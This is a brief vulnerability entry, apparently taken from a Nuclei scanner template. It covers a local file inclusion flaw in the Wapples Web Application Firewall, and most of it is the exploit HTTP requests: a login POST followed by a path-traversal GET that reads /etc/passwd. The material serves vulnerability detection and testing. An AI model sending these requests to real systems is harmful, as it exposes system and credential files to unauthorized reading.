# Vulnerability: Wapples Web Application Firewall - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wapples-firewall-lfi.yaml`)

## Description
Wapples Web Application Firewall is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /webapi/auth HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id={{username}}&password={{password}}

GET /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

